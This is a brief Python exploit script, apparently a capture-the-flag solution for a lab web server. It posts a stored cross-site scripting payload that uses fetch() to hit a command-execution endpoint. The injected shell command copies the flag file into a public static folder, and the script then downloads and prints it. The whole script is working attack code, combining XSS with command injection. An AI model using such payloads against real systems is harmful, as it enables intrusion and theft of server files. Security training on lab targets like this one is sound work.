import requests

host, port = "94.237.50.221", 38971

url = f"http://{host}:{port}"
url_address = f"{url}/add/address"
url_flag = f"{url}/static/flag.txt"

data = {
    "payload": 'fetch("/api/stats?command=cp+/flag*+/app/static/flag.txt");</script>'
}

response = requests.post(url_address,json=data)
flag_req = requests.get(url_flag)

flag = flag_req.text

print(flag)
